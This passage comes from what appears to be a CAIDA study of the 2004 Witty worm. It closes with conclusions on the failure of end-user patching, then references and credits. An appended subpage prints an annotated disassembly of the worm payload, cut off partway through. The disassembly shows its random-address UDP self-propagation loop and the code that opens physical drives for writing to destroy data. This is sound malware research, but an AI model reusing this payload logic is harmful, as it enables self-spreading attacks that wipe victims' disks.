  infection, additional hosts came online every morning
  (local time) in a diurnal cycle, shown also in Figure 7.
  </font></b></td>
  <td width="350"><b><font size="-1">Figure 7: The diurnal cycles
  of the Witty worm.  Countries in each temporal region
  (especially the hard-hit North American and European locales)
  show similar patterns of machines coming online in the morning,
  transmitting during the day, and shutting down in the evening.
  </font></b></td>
    </tr>
</table></center>
<h2><a name="Conclusions"/>Conclusions</h2>
<blockquote> 
<p>The Witty worm incorporates a number of dangerous characteristics.
It is the first widely spreading Internet worm to actively damage
infected machines.  It was started from a large set of machines
simultaneously, indicating the use of a hit list or a large number of
compromised machines.  Witty demonstrated that any minimally deployed
piece of software with a remotely exploitable bug can be a vector for
wide-scale compromise of host machines without any action on the part
of a victim.  The practical implications of this are staggering; with
minimal skill, a malevolent individual could break into thousands of
machines and use them for almost any purpose with little evidence of
the perpetrator left on most of the compromised hosts.
</p>
<p>While many of these Witty features are novel in a high-profile worm,
the same virulence combined with greater potential for host damage has
been a feature of bot networks (botnets) for years.  Any vulnerability
or backdoor that can be exploited by a worm can also be exploited by a
vastly stealthier botnet.  While all of the worms seen thus far have
carried a single payload, bot functionality can be easily changed over
time.  Thus while worms are a serious threat to Internet users, the
capabilities and stealth of botnets make them a more sinister menace.
The line separating worms from bot software is already blurry; over
time we can expect to see increasing stealth and flexibility in
Internet worms.
</p>
<p>Witty was the first widespread Internet worm to attack a
security product.  While technically the use of a buffer overflow
exploit is commonplace, the fact that all victims were compromised via
their firewall software the day after a vulnerability in that software
was publicized indicates that the security model in which end-users
apply patches to plug security holes is not viable.
</p>
<p>It is both impractical and unwise to expect every individual with a
computer connected to the Internet to be a security expert.  Yet the
current mechanism for dealing with security holes expects an end user
to constantly monitor security alert websites to learn about
security flaws and then to immediately download and install patches.  The
installation of patches is often difficult, involving a series of
complex steps that must be applied in precise order.
</p>
<p>The patch model for Internet security has failed spectacularly.  To
remedy this, there have been a number of suggestions for ways to try to
shoehorn end users into becoming security experts, including making
them financially liable for the consequences of their computers being
hijacked by malware or miscreants.  Notwithstanding the fundamental
inequities involved in encouraging people sign on to the Internet with
a single click, and then requiring them to fix flaws in software
marketed to them as secure with technical skills they do not possess,
many users do choose to protect themselves at their own expense by
purchasing antivirus and firewall software.  Making this choice is the
gold-standard for end user behavior -- they recognize both that
security is important and that they do not possess the skills necessary
to effect it themselves.  When users participating in the best security
practice that can be reasonably expected get infected with a virulent
and damaging worm, we need to reconsider the notion that end user
behavior can solve or even effectively mitigate the malicious software
problem and turn our attention toward both preventing software
vulnerabilities in the first place and developing large-scale, robust
and reliable infrastructure that can mitigate current security problems
without relying on end user intervention.
</p>
</blockquote> 
<h2><a name="Animations" />Animations</h2>
<blockquote>
<p>We have available animations of the spread of the Witty worm both
throughout  the world and within the United States.  In each animation,
a circle represents each site with one or more Witty-infected hosts.
The diameter of the circle is logarithmically scaled according to the
number of infected computers at that site.  Locations infected within
the first 60 seconds are shown in red, while locations infected after
the first 60 seconds are shown in yellow.  Note that red circles may
continue to increase in size as additional computers at those locations
are compromised later.  The latitude and longitude of each infected
computer were identified using <a
href="https://www.digitalenvoy.com">Digital Envoy</a>'s <a
href="https://www.digitalelement.com/solutions/ip-location-targeting/netacuity/">Netacuity</a>
tool.
</p>
<table cellpadding="10">
    <tr>
  <th>World:</th>
  <td><a href="animations/world_small-witty_2h.gif">Small (526x357)</a></td>
  <td><a href="animations/world_big-witty_2h.gif">Large (1046x710)</a></td>
    </tr><tr>
  <th>USA:</th>
  <td><a href="animations/usa_small-witty_2h.gif">Small (526x357)</a></td>
  <td><a href="animations/usa_big-witty_2h.gif">Large (1046x710)</a></td>
    </tr>
</table>
</blockquote> 
<h2><a name="References" />References</h2>
<blockquote>
<p>
    <a name="Slammer" /> [1] David Moore, Vern Paxson, Stefan Savage, Colleen Shannon, Stuart Staniford, and Nicholas Weaver, <a href="https://catalog.caida.org/paper/2003_sapphire2/">Inside the Slammer Worm</a>, IEEE Security and Privacy, vol. Aug 2003, Aug 2003.
</p><p>
    <a name="How20wn" /> [2] Stuart Staniford, Vern Paxson, and Nicholas Weaver, <a href="http://www.icir.org/vern/papers/cdc-usenix-sec02/">How to 0wn the Internet in Your Spare Time</a>, Proceedings of the 11th USENIX Security Symposium (Security '02).
</p><p>
    <a name="Quarantine" /> [3] David Moore, Colleen Shannon, Geoffrey Voelker and Stefan Savage, <a href="http://www.cs.ucsd.edu/users/savage/papers/Infocom03.pdf">Internet Quarantine: Requirements for Containing Self-Propagating Code</a>, Proceedings of the 2003 IEEE Infocom Conference, San Francisco, CA, April 2003. 
</p><p>
    <a name="TimeSync" /> <font color="red">[4]</font> Fri Mar 26 14:18:45 PST 2004 - a time
  synchronization glitch caused us to artifically view the
  beginning of the Witty worm spread as occurring 18 seconds
  later than it did.  In light of this development, we have
  updated our time for the initiation of the Witty worm spread.
</p>
</blockquote>
<h2><a name="Info"/>More Information</h2>
<ul>
    <li>Witty Worm
    <ul>
  <li>ISS vulnerability
  <ul>
      <li><a href="http://www.eeye.com/html/Research/Advisories/AD20040318.html">eEye: Internet Security Systems PAM ICQ Server Response Processing Vulnerability</a></li>
      <li><a href="http://seclists.org/lists/bugtraq/2004/Mar/0181.html">(mirrored at) Bugtraq: Internet Security Systems PAM ICQ Server Response Processing Vulnerability</a></li>
      <li>ISS: Vulnerability in ICQ Parsing in ISS Products</li>
      <li>Symantec: W32.Witty.Worm</li>
  </ul></li>
  <li>Worm code and function
  <ul>
      <li>LURHQ: Witty Worm Analysis</li>
      <li><a href="blackiceworm">(via Bugtraq) Kostya Kortchinsky: Black Ice Worm Disassembly</a></li>
  </ul></li>
    </ul></li>
    <li><a href="/projects/network_telescope/">UCSD Network Telescope Background</a></li>
    <li>Previous Internet Worm Studies
    <ul>
  <li><a href="/archive/code-red/coderedv2_analysis">The Spread of the Code-Red Worm</a></li>
  <li><a href="https://catalog.caida.org/paper/2002_codered/">Code-Red: a case study on the spread and victims of an Internet worm</a></li>
  <li><a href="https://catalog.caida.org/paper/2003_sapphire/sapphire.html">The Spread of the Sapphire/Slammer Worm</a> (With Vern Paxson (ICIR &amp; LBNL), Stefan Savage (UCSD CSE), Stuart Staniford (Silicon Defense), and Nicholas Weaver (Silicon Defense and  UC Berkeley EECS)</li>
    </ul></li>
    <li>Other Network Telescope Studies
    <ul>
  <li><a href="https://catalog.caida.org/paper/2001_backscatter/">Inferring Internet Denial-of-Service Activity</a></li>
  <li><a href="/archive/sco-dos/">SCO Offline from Denial-of-Service Attack</a></li>
    </ul></li>
</ul>
<h3><a name="Authors" />About the Authors:</h3>
<blockquote>
<p>
The network telescope and associated security efforts are a joint
project of the UCSD Computer Science and Engineering Department and the
Cooperative Association for Internet Data Analysis.  Colleen Shannon is
a Senior Security Researcher at the <a
href="https://www.caida.org">Cooperative Association for Internet Data
Analysis (CAIDA)</a> at the <a href="http://www.sdsc.edu">San Diego
Supercomputer Center (SDSC)</a> at the <a
href="http://www.ucsd.edu">University of California, San Diego
(UCSD)</a>.  David Moore is the Assistant Director of <a
href="https://www.caida.org">CAIDA</a> and Ph.D. Candidate in the <a
href="http://www.cs.ucsd.edu">UCSD Computer Science Department</a>.
</p>
</blockquote>
<h3><a name="Sponsors" />This work was sponsored by:</h3>
<blockquote>
<p>
<table>
    <tr>
  <td><a href="https://www.caida.org"><img src="/images/logo_caida.gif" alt="Cooperative Association for Internet Data Analysis" /></a></td>
  <td><a href="http://www.cs.ucsd.edu"><img src="/images/logo_ucsdcse.gif" alt="UCSD Computer Science Department" /></a></td>
  <td><a href="http://www.ucsd.edu"><img src="/images/logo_ucsd.gif" alt="University of California at San Diego" /></a></td>
  <td><a href="http://www.sdsc.edu"><img src="logo_sdsc_2004.gif" alt="San Diego Supercomputer Center" /></a></td>
  <td><a href="http://www.cisco.com"><img src="/images/logo_cisco.gif" alt="Cisco Systems" /></a></td>
  <td><a href="http://www.nsf.gov"><img src="/images/logo_NSF.gif" alt="National Science Foundation" /></a></td>
  <td><a href="http://www.darpa.mil"><img src="/images/logo_darpa.gif" alt="Defense Advanced Research Projects Agency" /></a></td>
  <td><a href="http://www.dhs.gov"><img src="/images/logo_dhs.gif" alt="U.S. Department of Homeland Security" /></a></td>
    </tr>
</table>
Grants from <a
href="http://www.cisco.com">Cisco Systems</a>, the <a
href="http://www.nsf.gov">National Science Foundation (NSF)</a>, the <a
href="http://www.darpa.mil">Defense Advanced Research Projects Agency
(DARPA)</a>, the <a href="http://www.dhs.gov">Department of Homeland
Security (DHS)</a>, and <a href="/about/sponsors/">CAIDA
members</a>.
</p>
</blockquote>

</div>
    <hr>
    <h2 id="subpages">Additional Content</h2>  <h3 class="title-summary"><i class="fa fa-folder-open"></i> <a href="/archive/witty/blackiceworm/">/archive/witty/blackiceworm/</a></h3>
  <div class="summary mb-2">
    <p><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>IDA - C:\Documents and Settings\Administrateur\Mes documents\ICQ.idb (ICQ)</title>
</head>
<body bgcolor="white">
<span style="font: FixedSys; color: blue; background: white">
<object>
<pre>
; Disassembly by Kostya Kortchinsky
;
;
; +-------------------------------------------------------------------------+
;      This file is generated by The Interactive Disassembler (IDA)        
;      Copyright (c) 2004 by DataRescue sa/nv, &lt;ida@datarescue.com&gt;        
;    Licensed to: Kostya Kortchinsky, GIP Renater, 1 user, std, 11/2003    
; +-------------------------------------------------------------------------+
;
<span style="color:maroon">seg000:000000D1                   </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:000000D1
</span><span style="color:maroon">seg000:000000D1                   </span><span style="color:navy">loc_D1:                                 </span><span style="color:green">; CODE XREF: seg000:000002ABj
</span><span style="color:maroon">seg000:000000D1 </span>89 E7                             <span style="color:navy">mov     edi</span><span style="color:navy">, esp</span>
<span style="color:maroon">seg000:000000D3 </span>8B 7F 14                          <span style="color:navy">mov     edi</span><span style="color:navy">, [edi+</span><span style="color:green">14h</span><span style="color:navy">]</span>
<span style="color:maroon">seg000:000000D6 </span>83 C7 08                          <span style="color:navy">add     edi</span><span style="color:navy">, </span><span style="color:green">8</span>
<span style="color:maroon">seg000:000000D9 </span>81 C4 E8 FD FF FF                 <span style="color:navy">add     esp</span><span style="color:navy">, </span><span style="color:green">0FFFFFDE8h</span>
<span style="color:maroon">seg000:000000DF </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:000000E1 </span>66 B9 33 32                       <span style="color:navy">mov     cx</span><span style="color:navy">, </span><span style="color:green">3233h</span>       ; 32
<span style="color:maroon">seg000:000000E5 </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:000000E6 </span>68 77 73 32 5F                    <span style="color:navy">push    </span><span style="color:green">5F327377h</span>       ; ws2_
<span style="color:maroon">seg000:000000EB </span>54                                <span style="color:navy">push    esp</span>
<span style="color:maroon">seg000:000000EC                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:000000EC </span>3E FF 15 9C 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D409Ch</span> ; Probably LoadLibrary
<span style="color:maroon">seg000:000000F3 </span>89 C3                             <span style="color:navy">mov     ebx</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000000F5 </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:000000F7 </span>66 B9 65 74                       <span style="color:navy">mov     cx</span><span style="color:navy">, </span><span style="color:green">7465h</span>       ; et
<span style="color:maroon">seg000:000000FB </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:000000FC </span>68 73 6F 63 6B                    <span style="color:navy">push    </span><span style="color:green">6B636F73h</span>       ; sock
<span style="color:maroon">seg000:00000101 </span>54                                <span style="color:navy">push    esp</span>
<span style="color:maroon">seg000:00000102 </span>53                                <span style="color:navy">push    ebx</span>
<span style="color:maroon">seg000:00000103                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:00000103 </span>3E FF 15 98 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D4098h</span> ; Probably GetProcAddress
<span style="color:maroon">seg000:0000010A </span>6A 11                             <span style="color:navy">push    </span><span style="color:green">11h</span>             ; IPPROTO_UDP
<span style="color:maroon">seg000:0000010C </span>6A 02                             <span style="color:navy">push    </span><span style="color:green">2</span>               ; SOCK_DGRAM
<span style="color:maroon">seg000:0000010E </span>6A 02                             <span style="color:navy">push    </span><span style="color:green">2</span>               ; AF_INET
<span style="color:maroon">seg000:00000110 </span>FF D0                             <span style="color:navy">call    eax</span>             ; socket()
<span style="color:maroon">seg000:00000112 </span>89 C6                             <span style="color:navy">mov     esi</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:00000114 </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:00000116 </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:00000117 </span>68 62 69 6E 64                    <span style="color:navy">push    </span><span style="color:green">646E6962h</span>       ; bind
<span style="color:maroon">seg000:0000011C </span>54                                <span style="color:navy">push    esp</span>
<span style="color:maroon">seg000:0000011D </span>53                                <span style="color:navy">push    ebx</span>
<span style="color:maroon">seg000:0000011E                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:0000011E </span>3E FF 15 98 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D4098h</span> ; Probably GetProcAddress
<span style="color:maroon">seg000:00000125 </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:00000127 </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:00000128 </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:00000129 </span>51                                <span style="color:navy">push    ecx</span>             ; sin.sin_addr.s_addr = INADDR_ANY
<span style="color:maroon">seg000:0000012A </span>81 E9 FE FF F0 5F                 <span style="color:navy">sub     ecx</span><span style="color:navy">, </span><span style="color:green">5FF0FFFEh</span>  ; 0xa00f0002
<span style="color:maroon">seg000:00000130 </span>51                                <span style="color:navy">push    ecx</span>             ; sin.sin_family = AF_INET
<span style="color:maroon">seg000:00000130                                                           </span>; sin.sin_port = htons(4000)
<span style="color:maroon">seg000:00000131 </span>89 E1                             <span style="color:navy">mov     ecx</span><span style="color:navy">, esp</span>
<span style="color:maroon">seg000:00000133 </span>6A 10                             <span style="color:navy">push    </span><span style="color:green">10h</span>             ; sizeof(struct sockaddr)
<span style="color:maroon">seg000:00000135 </span>51                                <span style="color:navy">push    ecx</span>             ; &amp;sin
<span style="color:maroon">seg000:00000136 </span>56                                <span style="color:navy">push    esi</span>             ; s
<span style="color:maroon">seg000:00000137 </span>FF D0                             <span style="color:navy">call    eax</span>             ; bind()
<span style="color:maroon">seg000:00000139 </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:0000013B </span>66 B9 74 6F                       <span style="color:navy">mov     cx</span><span style="color:navy">, </span><span style="color:green">6F74h</span>       ; to
<span style="color:maroon">seg000:0000013F </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:00000140 </span>68 73 65 6E 64                    <span style="color:navy">push    </span><span style="color:green">646E6573h</span>       ; send
<span style="color:maroon">seg000:00000145 </span>54                                <span style="color:navy">push    esp</span>
<span style="color:maroon">seg000:00000146 </span>53                                <span style="color:navy">push    ebx</span>
<span style="color:maroon">seg000:00000147                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:00000147 </span>3E FF 15 98 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D4098h</span> ; Probably GetProcAddress
<span style="color:maroon">seg000:0000014E </span>89 C3                             <span style="color:navy">mov     ebx</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:00000150 </span>83 C4 3C                          <span style="color:navy">add     esp</span><span style="color:navy">, </span><span style="color:green">3Ch</span>
<span style="color:maroon">seg000:00000153
</span><span style="color:maroon">seg000:00000153                   </span><span style="color:navy">loc_153:                                </span><span style="color:green">; CODE XREF: seg000:000002A2j
</span><span style="color:maroon">seg000:00000153 </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:00000155 </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:00000156 </span>68 65 6C 33 32                    <span style="color:navy">push    </span><span style="color:green">32336C65h</span>       ; el32
<span style="color:maroon">seg000:0000015B </span>68 6B 65 72 6E                    <span style="color:navy">push    </span><span style="color:green">6E72656Bh</span>       ; kern
<span style="color:maroon">seg000:00000160 </span>54                                <span style="color:navy">push    esp</span>
<span style="color:maroon">seg000:00000161                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:00000161 </span>3E FF 15 9C 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D409Ch</span> ; Probably LoadLibrary
<span style="color:maroon">seg000:00000168 </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:0000016A </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:0000016B </span>68 6F 75 6E 74                    <span style="color:navy">push    </span><span style="color:green">746E756Fh</span>       ; ount
<span style="color:maroon">seg000:00000170 </span>68 69 63 6B 43                    <span style="color:navy">push    </span><span style="color:green">436B6369h</span>       ; ickC
<span style="color:maroon">seg000:00000175 </span>68 47 65 74 54                    <span style="color:navy">push    </span><span style="color:green">54746547h</span>       ; GetT
<span style="color:maroon">seg000:0000017A </span>54                                <span style="color:navy">push    esp</span>
<span style="color:maroon">seg000:0000017B </span>50                                <span style="color:navy">push    eax</span>
<span style="color:maroon">seg000:0000017C                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:0000017C </span>3E FF 15 98 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D4098h</span> ; Probably GetProcAddress
<span style="color:maroon">seg000:00000183 </span>FF D0                             <span style="color:navy">call    eax</span>             ; GetTickCount()
<span style="color:maroon">seg000:00000185 </span>89 C5                             <span style="color:navy">mov     ebp</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:00000187 </span>83 C4 1C                          <span style="color:navy">add     esp</span><span style="color:navy">, </span><span style="color:green">1Ch</span>
<span style="color:maroon">seg000:0000018A </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:0000018C </span>81 E9 E0 B1 FF FF                 <span style="color:navy">sub     ecx</span><span style="color:navy">, </span><span style="color:green">0FFFFB1E0h</span> ; 0x4e20
<span style="color:maroon">seg000:00000192
</span><span style="color:maroon">seg000:00000192                   </span><span style="color:navy">loc_192:                                </span><span style="color:green">; CODE XREF: seg000:000001F8j
</span><span style="color:maroon">seg000:00000192                                                           </span><span style="color:green">; seg000:00000255j
</span><span style="color:maroon">seg000:00000192 </span>51                                <span style="color:navy">push    ecx</span>
<span style="color:maroon">seg000:00000193 </span>31 C0                             <span style="color:navy">xor     eax</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:00000195 </span>2D 03 BC FC FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFFCBC03h</span> ; 0x343fd
<span style="color:maroon">seg000:0000019A </span>F7 E5                             <span style="color:navy">mul     ebp</span>
<span style="color:maroon">seg000:0000019C </span>2D 3D 61 D9 FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFD9613Dh</span> ; 0x269ec3
<span style="color:maroon">seg000:000001A1 </span>89 C1                             <span style="color:navy">mov     ecx</span><span style="color:navy">, eax</span>        ; rand() function, without the 0x7fff mask, shift coming afterwards
<span style="color:maroon">seg000:000001A1                                                           </span>; srand() done with GetTickCount()
<span style="color:maroon">seg000:000001A3 </span>31 C0                             <span style="color:navy">xor     eax</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000001A5 </span>2D 03 BC FC FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFFCBC03h</span>
<span style="color:maroon">seg000:000001AA </span>F7 E1                             <span style="color:navy">mul     ecx</span>
<span style="color:maroon">seg000:000001AC </span>2D 3D 61 D9 FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFD9613Dh</span>
<span style="color:maroon">seg000:000001B1 </span>89 C5                             <span style="color:navy">mov     ebp</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000001B3 </span>31 D2                             <span style="color:navy">xor     edx</span><span style="color:navy">, edx</span>
<span style="color:maroon">seg000:000001B5 </span>52                                <span style="color:navy">push    edx</span>
<span style="color:maroon">seg000:000001B6 </span>52                                <span style="color:navy">push    edx</span>
<span style="color:maroon">seg000:000001B7 </span>C1 E9 10                          <span style="color:navy">shr     ecx</span><span style="color:navy">, </span><span style="color:green">10h</span>
<span style="color:maroon">seg000:000001BA </span>66 89 C8                          <span style="color:navy">mov     ax</span><span style="color:navy">, cx</span>
<span style="color:maroon">seg000:000001BD </span>50                                <span style="color:navy">push    eax</span>             ; to.sin_addr.s_addr = (rand() &lt;&lt; 16) | rand()
<span style="color:maroon">seg000:000001BE </span>31 C0                             <span style="color:navy">xor     eax</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000001C0 </span>2D 03 BC FC FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFFCBC03h</span>
<span style="color:maroon">seg000:000001C5 </span>F7 E5                             <span style="color:navy">mul     ebp</span>
<span style="color:maroon">seg000:000001C7 </span>2D 3D 61 D9 FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFD9613Dh</span>
<span style="color:maroon">seg000:000001CC </span>89 C5                             <span style="color:navy">mov     ebp</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000001CE </span>30 E4                             <span style="color:navy">xor     ah</span><span style="color:navy">, ah</span>
<span style="color:maroon">seg000:000001D0 </span>B0 02                             <span style="color:navy">mov     al</span><span style="color:navy">, </span><span style="color:green">2</span>
<span style="color:maroon">seg000:000001D2 </span>50                                <span style="color:navy">push    eax</span>             ; to.sin_family = AF_INET
<span style="color:maroon">seg000:000001D2                                                           </span>; to.sin_port = rand()
<span style="color:maroon">seg000:000001D3 </span>89 E0                             <span style="color:navy">mov     eax</span><span style="color:navy">, esp</span>
<span style="color:maroon">seg000:000001D5 </span>6A 10                             <span style="color:navy">push    </span><span style="color:green">10h</span>             ; sizeof(struct sockaddr)
<span style="color:maroon">seg000:000001D7 </span>50                                <span style="color:navy">push    eax</span>             ; &amp;to
<span style="color:maroon">seg000:000001D8 </span>31 C0                             <span style="color:navy">xor     eax</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000001DA </span>50                                <span style="color:navy">push    eax</span>             ; flags
<span style="color:maroon">seg000:000001DB </span>2D 03 BC FC FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFFCBC03h</span>
<span style="color:maroon">seg000:000001E0 </span>F7 E5                             <span style="color:navy">mul     ebp</span>
<span style="color:maroon">seg000:000001E2 </span>2D 3D 61 D9 FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFD9613Dh</span>
<span style="color:maroon">seg000:000001E7 </span>89 C5                             <span style="color:navy">mov     ebp</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000001E9 </span>C1 E8 17                          <span style="color:navy">shr     eax</span><span style="color:navy">, </span><span style="color:green">17h</span>
<span style="color:maroon">seg000:000001EC </span>80 C4 03                          <span style="color:navy">add     ah</span><span style="color:navy">, </span><span style="color:green">3</span>
<span style="color:maroon">seg000:000001EF </span>50                                <span style="color:navy">push    eax</span>             ; len = 0x300 + (rand() &gt;&gt; 7)
<span style="color:maroon">seg000:000001F0 </span>57                                <span style="color:navy">push    edi</span>             ; buf
<span style="color:maroon">seg000:000001F1 </span>56                                <span style="color:navy">push    esi</span>             ; s
<span style="color:maroon">seg000:000001F2 </span>FF D3                             <span style="color:navy">call    ebx</span>             ; sendto()
<span style="color:maroon">seg000:000001F4 </span>83 C4 10                          <span style="color:navy">add     esp</span><span style="color:navy">, </span><span style="color:green">10h</span>
<span style="color:maroon">seg000:000001F7 </span>59                                <span style="color:navy">pop     ecx</span>
<span style="color:maroon">seg000:000001F8 </span>E2 98                             <span style="color:navy">loop    loc_192</span>
<span style="color:maroon">seg000:000001FA </span>31 C0                             <span style="color:navy">xor     eax</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:000001FC </span>2D 03 BC FC FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFFCBC03h</span>
<span style="color:maroon">seg000:00000201 </span>F7 E5                             <span style="color:navy">mul     ebp</span>
<span style="color:maroon">seg000:00000203 </span>2D 3D 61 D9 FF                    <span style="color:navy">sub     eax</span><span style="color:navy">, </span><span style="color:green">0FFD9613Dh</span>
<span style="color:maroon">seg000:00000208 </span>89 C5                             <span style="color:navy">mov     ebp</span><span style="color:navy">, eax</span>
<span style="color:maroon">seg000:0000020A </span>C1 E8 10                          <span style="color:navy">shr     eax</span><span style="color:navy">, </span><span style="color:green">10h</span>
<span style="color:maroon">seg000:0000020D </span>80 E4 07                          <span style="color:navy">and     ah</span><span style="color:navy">, </span><span style="color:green">7</span>
<span style="color:maroon">seg000:00000210 </span>80 CC 30                          <span style="color:navy">or      ah</span><span style="color:navy">, </span><span style="color:green">30h</span>         ; 0x30 | (rand() &amp; 7)
<span style="color:maroon">seg000:00000213 </span>B0 45                             <span style="color:navy">mov     al</span><span style="color:navy">, </span><span style="color:#ff8000">45h</span> <span style="color:gray">; 'E'   </span>; E
<span style="color:maroon">seg000:00000215 </span>50                                <span style="color:navy">push    eax</span>
<span style="color:maroon">seg000:00000216 </span>68 44 52 49 56                    <span style="color:navy">push    </span><span style="color:green">56495244h</span>       ; DRIV
<span style="color:maroon">seg000:0000021B </span>68 49 43 41 4C                    <span style="color:navy">push    </span><span style="color:green">4C414349h</span>       ; ICAL
<span style="color:maroon">seg000:00000220 </span>68 50 48 59 53                    <span style="color:navy">push    </span><span style="color:green">53594850h</span>       ; PHYS
<span style="color:maroon">seg000:00000225 </span>68 5C 5C 2E 5C                    <span style="color:navy">push    </span><span style="color:green">5C2E5C5Ch</span>       ; \\.\
<span style="color:maroon">seg000:00000225                                                           </span>; we get here \\.\PHYSICALDRIVE0 to \\.\PHYSICALDRIVE7
<span style="color:maroon">seg000:0000022A </span>89 E0                             <span style="color:navy">mov     eax</span><span style="color:navy">, esp</span>
<span style="color:maroon">seg000:0000022C </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:0000022E </span>51                                <span style="color:navy">push    ecx</span>             ; NULL
<span style="color:maroon">seg000:0000022F </span>B2 20                             <span style="color:navy">mov     dl</span><span style="color:navy">, </span><span style="color:#ff8000">20h</span> <span style="color:gray">; ' '
</span><span style="color:maroon">seg000:00000231 </span>C1 E2 18                          <span style="color:navy">shl     edx</span><span style="color:navy">, </span><span style="color:green">18h</span>
<span style="color:maroon">seg000:00000234 </span>52                                <span style="color:navy">push    edx</span>             ; FILE_FLAG_NO_BUFFERING (0x20000000)
<span style="color:maroon">seg000:00000235 </span>6A 03                             <span style="color:navy">push    </span><span style="color:green">3</span>               ; OPEN_EXISTING
<span style="color:maroon">seg000:00000237 </span>51                                <span style="color:navy">push    ecx</span>             ; NULL
<span style="color:maroon">seg000:00000238 </span>6A 03                             <span style="color:navy">push    </span><span style="color:green">3</span>               ; FILE_SHARE_READ | FILE_SHARE_WRITE
<span style="color:maroon">seg000:0000023A </span>D1 E2                             <span style="color:navy">shl     edx</span><span style="color:navy">, </span><span style="color:green">1</span>
<span style="color:maroon">seg000:0000023C </span>52                                <span style="color:navy">push    edx</span>             ; GENERIC_WRITE (0x40000000)
<span style="color:maroon">seg000:0000023D </span>50                                <span style="color:navy">push    eax</span>             ; lpFileName
<span style="color:maroon">seg000:0000023E                                   </span><span style="color:navy">db      </span><span style="color:green">3Eh
</span><span style="color:maroon">seg000:0000023E </span>3E FF 15 DC 40 0D+                <span style="color:navy">call    dword ptr ds:</span><span style="color:green">5E0D40DCh</span> ; Probably CreateFile
<span style="color:maroon">seg000:00000245 </span>83 C4 14                          <span style="color:navy">add     esp</span><span style="color:navy">, </span><span style="color:green">14h</span>
<span style="color:maroon">seg000:00000248 </span>31 C9                             <span style="color:navy">xor     ecx</span><span style="color:navy">, ecx</span>
<span style="color:maroon">seg000:0000024A </span>81 E9 E0 B1 FF FF                 <span style="color:navy">sub     ecx</span><span style="color:navy">, </span><span style="color:green">0FFFFB1E0h</span> ; 0x4e20
<span style="color:maroon">seg000:00000250 </span>3D FF FF FF FF                    <span style="color:navy">cmp     eax</span><span style="color:navy">, </span><span style="color:green">0FFFFFFFFh</span>
<span style="color:maroon">seg000:00000255 </span>0F 84 37 FF FF FF                 <span style="color:navy">jz      loc_192</span>
<span style="color:maroon">seg000:0000025B </span>56                                <span style="color:navy">push    esi</span>             ; (saving socket)
<span style="color:maroon">seg000:0000025C </span>89 C6                             <span style="color:navy">mov     esi</span><span style="color:navy">, eax</span>
